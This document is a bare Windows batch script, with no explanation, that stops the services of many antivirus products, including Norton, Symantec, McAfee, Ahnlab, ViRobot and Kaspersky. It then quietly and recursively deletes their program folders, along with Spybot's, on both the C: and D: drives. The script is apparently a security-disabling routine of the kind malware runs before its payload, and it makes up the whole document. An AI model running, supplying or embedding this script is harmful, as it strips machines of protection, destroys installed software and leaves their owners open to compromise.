net stop "Norton AntiVirus Server"
net stop "Norton AntiVirus Auto Protect Service"
net stop "Norton AntiVirus Client"
net stop "Symantec AntiVirus Client"
net stop "McShield"
net stop "navapsvc"
net stop "rtvscan"
net stop "vshield"
net stop "alertmanager"
net stop "mctaskmanager"
net stop "NProtectService"
net stop "ViRobot for WinNT(tm) Monitoring"
net stop "ViRobot for WinNT(tm) Update"
net stop "vrupsvc"
net stop "vrmonsvr"
net stop "avpcc"
cd C:\Program Files
rmdir "Ahnlab" /s /q
rmdir "Norton SystemWorks" /s /q
rmdir "norton antivirus" /s /q
rmdir "NavNT"
rmdir "SavNT"
rmdir "Nav"
rmdir "Sav"
rmdir "network associates" /s /q
rmdir "ViRobot NT" /s /q
rmdir "ViRobotXP" /s /q
rmdir "Kaspersky Labs" /s /q
rmdir "Symantec_Client_Security" /s /q
rmdir "Spybot - Search & Destroy" /s /q
rmdir "Spybot - Search & Destroy 1.1" /s /q
rmdir "Spybot - Search & Destroy 1.2" /s /q
cd c:\Program Files\Common Files
rmdir "Symantec Shared" /s /q
rmdir "Ahnlab" /s /q
d:
cd d:\Program Files
rmdir "Ahnlab" /s /q
rmdir "Norton SystemWorks" /s /q
rmdir "norton antivirus" /s /q
rmdir "NavNT"
rmdir "SavNT"
rmdir "Nav"
rmdir "Sav"
rmdir "network associates" /s /q
rmdir "ViRobot NT" /s /q
rmdir "ViRobotXP" /s /q
rmdir "Kaspersky Labs" /s /q
rmdir "Symantec_Client_Security" /s /q
rmdir "Spybot - Search & Destroy" /s /q
rmdir "Spybot - Search & Destroy 1.1" /s /q
rmdir "Spybot - Search & Destroy 1.2" /s /q
cd d:\Program Files\Common Files
rmdir "Symantec Shared" /s /q
rmdir "Ahnlab" /s /q